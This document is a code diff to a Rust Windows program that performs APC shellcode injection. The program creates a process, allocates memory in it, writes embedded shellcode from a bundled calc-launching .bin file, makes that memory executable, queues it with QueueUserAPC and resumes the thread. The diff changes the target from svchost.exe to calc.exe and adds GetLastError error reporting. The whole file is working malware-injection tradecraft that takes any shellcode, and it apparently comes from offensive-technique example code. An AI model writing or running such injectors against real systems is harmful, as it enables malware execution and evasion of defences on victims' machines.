@@ -2,7 +2,7 @@
 
 use std::mem::{transmute, zeroed};
 use std::ptr::{null, null_mut};
-use windows_sys::Win32::Foundation::{CloseHandle, FALSE, TRUE};
+use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE, TRUE};
 use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows_sys::Win32::System::Memory::{
     VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
@@ -12,13 +12,11 @@ use windows_sys::Win32::System::Threading::{
     PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
 };
 
-const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
-const SIZE: usize = SHELLCODE.len();
-
 #[cfg(target_os = "windows")]
 fn main() {
-    let mut old = PAGE_READWRITE;
-    let program = b"C:\\Windows\\System32\\svchost.exe\0";
+    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
+    let shellcode_size: usize = shellcode.len();
+    let program = b"C:\\Windows\\System32\\calc.exe\0";
 
     unsafe {
         let mut pi: PROCESS_INFORMATION = zeroed();
@@ -39,44 +37,55 @@ fn main() {
             &mut pi,
         );
         if res == FALSE {
-            panic!("CreateProcessA failed!");
+            panic!("[-]CreateProcessA failed: {}!", GetLastError());
         }
 
-        let dest = VirtualAllocEx(
+        let addr = VirtualAllocEx(
             pi.hProcess,
             null(),
-            SIZE,
+            shellcode_size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
-        if dest.is_null() {
-            panic!("VirtualAllocEx failed!");
+        if addr.is_null() {
+            panic!("[-]VirtualAllocEx failed: {}!", GetLastError());
         }
 
         let res = WriteProcessMemory(
             pi.hProcess,
-            dest,
-            SHELLCODE.as_ptr().cast(),
-            SIZE,
+            addr,
+            shellcode.as_ptr().cast(),
+            shellcode_size,
             null_mut(),
         );
         if res == FALSE {
-            panic!("WriteProcessMemory failed!");
+            panic!("[-]WriteProcessMemory failed: {}!", GetLastError());
         }
 
-        let res = VirtualProtectEx(pi.hProcess, dest, SIZE, PAGE_EXECUTE, &mut old);
+        let mut old = PAGE_READWRITE;
+        let res = VirtualProtectEx(pi.hProcess, addr, shellcode_size, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            panic!("VirtualProtectEx failed!");
+            panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
         }
 
-        let dest = transmute(dest);
-        let res = QueueUserAPC(Some(dest), pi.hThread, 0);
+        let func = transmute(addr);
+        let res = QueueUserAPC(Some(func), pi.hThread, 0);
         if res == 0 {
-            panic!("QueueUserAPC failed!");
+            panic!("[-]QueueUserAPC failed: {}!", GetLastError());
         }
-        ResumeThread(pi.hThread);
+        let res = ResumeThread(pi.hThread);
+        if res == 0u32 {
+            panic!("[-]ResumeThread failed: {}!", GetLastError());
+        }
 
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        let res = CloseHandle(pi.hProcess);
+        if res == FALSE {
+            panic!("[-]CloseHandle failed: {}!", GetLastError());
+        }
+
+        let res = CloseHandle(pi.hThread);
+        if res == FALSE {
+            panic!("[-]CloseHandle failed: {}!", GetLastError());
+        }
     }
 }
